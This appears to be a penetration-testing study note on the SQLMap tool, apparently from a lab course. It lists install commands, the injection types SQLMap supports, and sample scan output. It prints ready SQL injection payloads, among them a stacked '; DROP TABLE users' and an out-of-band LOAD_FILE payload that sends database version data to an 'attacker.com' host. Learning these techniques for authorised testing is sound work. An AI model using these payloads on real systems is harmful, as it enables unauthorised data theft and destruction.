# SQLMap Overview

SQLMap is a free and open-source penetration testing tool written in Python that automates the process of detecting and exploiting SQL injection (SQLi) flaws. 

python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'

# SQLMap Installation

sudo apt install sqlmap

OR

git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

python sqlmap.py

# Supported SQL Injection Types

sqlmap -hh
B: Boolean-based blind
E: Error-based
U: Union query-based
S: Stacked queries
T: Time-based blind
Q: Inline queries

## Boolean-based blind SQL Injection
AND 1=1

## Error-based SQL Injection
AND GTID_SUBSET(@@version,0)

## UNION query-based
UNION ALL SELECT 1,@@version,3

## Stacked queries
; DROP TABLE users

## Time-based blind SQL Injection
AND 1=IF(2>1,SLEEP(5),0)

## Inline queries
SELECT (SELECT @@version) from

## Out-of-band SQL Injection
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))

# Example of sqlmap use

sqlmap -u "http://www.example.com/vuln.php?id=1" --batch

Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 8814=8814

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 7744 FROM(SELECT COUNT(*),CONCAT(0x7170706a71,(SELECT (ELT(7744=7744,1))),0x71707a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 3669 FROM (SELECT(SLEEP(5)))TIxJ)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170706a71,0x554d766a4d694850596b754f6f716250584a6d53485a52474a7979436647576e766a595374436e78,0x71707a7871)-- -
---


